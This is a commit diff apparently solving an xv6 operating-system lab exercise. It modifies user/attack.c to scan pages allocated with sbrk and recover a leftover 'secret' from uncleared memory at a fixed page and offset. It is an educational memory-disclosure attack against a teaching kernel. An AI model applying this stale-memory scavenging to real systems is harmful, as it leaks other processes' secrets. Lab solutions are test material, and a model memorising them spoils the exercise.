4c551f3847336d22dc15c73be93eac9f81760649
liginity <liginity@outlook.com>
2024-12-04 16:13:41 +0800

    Get the secret in attack.c
    In my test, the secret sits at a fixed location.

--- user/attack.c
+++ user/attack.c
@@ -10,11 +10,18 @@ main(int argc, char *argv[])
   // (e.g., write(2, secret, 8)
   const int number_of_pages = 32;
   const int offset = 32;
+  const int secret_size = 8;
+
   char *end = sbrk(PGSIZE * number_of_pages);
-  for (int i = 0; i < number_of_pages; ++i) {
+  for (int i = -1; i < number_of_pages; ++i) {
     char *p = end + i * PGSIZE;
-    p[offset] = '\0';
+    // p[offset] = '\0';
     fprintf(1, "at page %d (address %p), the string is \"%s\"\n", i, p, p);
+    fprintf(1, "           (address %p), \"%s\"\n", p + offset, p + offset);
   }
+  // from my test, the secret sits on the 16th page.
+  const char *secret = end + 16 * PGSIZE + offset;
+  // fprintf(2, "%s", secret);
+  write(2, secret, secret_size);
   exit(1);
 }
